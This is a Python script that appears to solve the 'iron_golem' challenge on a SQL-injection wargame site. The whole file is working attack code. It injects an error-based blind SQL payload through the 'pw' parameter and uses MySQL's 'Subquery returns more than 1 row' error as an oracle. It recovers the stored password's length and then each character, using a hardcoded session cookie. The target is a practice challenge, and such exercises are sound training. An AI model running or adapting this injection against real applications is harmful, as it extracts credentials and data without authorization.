import sys
import urllib
import requests


def get_ascii(param, idx):
    url = f"https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?pw=%27||id="
    while(True):
        idx += 1
        data = f"{url}if(({param}={idx}),(select%201%20union%20select%202),%27admin%27)%23"
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
                , 'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'}
        cookie = {'PHPSESSID' : 'g9o4cgj8bfhf2m43m6podiqkhl'}
        res = requests.get(data, headers=headers, cookies = cookie)
        if 'Subquery returns more than 1 row' in res.text:
            return idx
        
    


def get_length(query):
    return get_ascii("length(%s)" % query, 0)

def get_content(query):
    content_len = get_length(query)
    content = ''
    # print(content_len)
    if content_len == 0:
        print('Invalid input')
        return ''
    if content_len == "error":
        print("Error")
        return "error"
    for idx in range(1, content_len + 1):
        content += chr(get_ascii('ascii(right(left(%s,%d),1))' % (query, idx), 30))
        sys.stdout.write('\r[' + str(content_len) + '] ' + content + '_' * (content_len - len(content)))

    sys.stdout.write('\n')

    return content



content = get_content('pw')
